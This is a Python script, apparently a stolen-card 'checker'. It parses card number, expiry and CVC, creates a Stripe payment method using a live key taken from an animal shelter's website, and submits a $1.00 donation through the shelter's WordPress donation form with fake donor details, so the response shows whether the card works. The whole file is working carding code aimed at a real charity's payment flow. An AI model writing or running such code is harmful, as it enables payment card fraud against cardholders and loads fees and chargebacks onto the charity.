import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fe96dd26916%3B+stripe-js-v3%2Fe96dd26916%3B+card-element&referrer=https%3A%2F%2Fschoharieanimalshelter.org&time_on_page=142593&client_attribution_metadata[client_session_id]=cf71ce33-3c08-475f-8fbc-964d0c989d1a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=9011b9f5-12f1-4cf2-afa3-a84ee9a3e6fa&key=pk_live_51RtV0tDAWikoPU2VCVIHjvCe3btx7mhmFGMGs27RBjC8TgtCnkvS5mxeYMsHlDRDXaeUDzWqURwZcdooLHI2KPPR00xLWu5YWz'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']
	
	cookies = {
    '_ga': 'GA1.1.1812074951.1781942828',
    '__stripe_mid': '6d59f657-a0da-47c4-9324-60d7780c18533a85a5',
    '__stripe_sid': 'add52eee-967d-4c21-b036-86788d80a3d3005f26',
    '_ga_HSSM6BFV57': 'GS2.1.s1781942828$o1$g1$t1781943588$j60$l0$h0',
}

	headers = {
    'authority': 'schoharieanimalshelter.org',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_ga=GA1.1.1812074951.1781942828; __stripe_mid=6d59f657-a0da-47c4-9324-60d7780c18533a85a5; __stripe_sid=add52eee-967d-4c21-b036-86788d80a3d3005f26; _ga_HSSM6BFV57=GS2.1.s1781942828$o1$g1$t1781943588$j60$l0$h0',
    'origin': 'https://schoharieanimalshelter.org',
    'referer': 'https://schoharieanimalshelter.org/donate/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	params = {
    't': '1781943595173',
}
				
	data = {
    'data': '__fluent_form_embded_post_id=55&_fluentform_3_fluentformnonce=79a0947243&_wp_http_referer=%2Fdonate%2F&input_text=Niko&input_text_1=Lak&email=goldcalture99%40gmail.com&address_1%5Baddress_line_1%5D=17%20alian%20st&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20york&address_1%5Bstate%5D=New%20york&address_1%5Bzip%5D=10017&address_1%5Bcountry%5D=US&payment_input=Other%20Amount&custom-payment-amount=1.00&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '3',
}
	
	r2 = requests.post(
    'https://schoharieanimalshelter.org/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
	return (r2.json())
